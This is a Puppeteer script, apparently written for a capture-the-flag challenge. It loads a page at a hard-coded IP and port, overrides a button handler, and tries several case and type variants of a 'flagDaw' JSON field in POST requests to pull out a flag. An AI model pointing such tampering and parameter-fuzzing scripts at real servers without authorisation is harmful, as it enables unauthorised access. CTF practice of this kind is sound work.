const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  page.on('response', async response => {
    if (response.url().includes('6969') && response.request().method() === 'POST') {
      const text = await response.text();
      console.log('POST Response:', text);
      if (text.includes('CS{')) {
        console.log('*** FLAG FOUND ***');
      }
    }
  });
  
  page.on('dialog', async dialog => {
    const message = dialog.message();
    console.log('ALERT:', message);
    if (message.includes('CS{')) {
      console.log('*** FLAG FOUND ***');
    }
    await dialog.accept();
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Modify the JavaScript before it runs - change flagDaw to something else
    await page.evaluate(() => {
      // Override the button click handler
      const button = document.getElementById('button');
      button.onclick = null; // Remove old handler
      
      button.addEventListener("click", async () => {
        // Try with lowercase flagdaw
        const flag = await fetch("/", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ flagdaw: true }),
        }).then((r) => r.text());

        alert(flag);
      });
    });
    
    console.log('Clicking modified button...');
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Also try direct fetch with different variations
    const variations = [
      { flagdaw: true },
      { FlagDaw: true },
      { FLAGDAW: true },
      { flagDaw: false },
      { flagDaw: "true" },
      { flagDaw: 1 }
    ];
    
    for (const payload of variations) {
      console.log(`\nTrying payload:`, payload);
      const result = await page.evaluate(async (p) => {
        const res = await fetch("/", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(p),
        });
        return await res.text();
      }, payload);
      console.log('Result:', result);
      if (result.includes('CS{')) {
        console.log('*** FLAG FOUND ***');
        break;
      }
    }
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

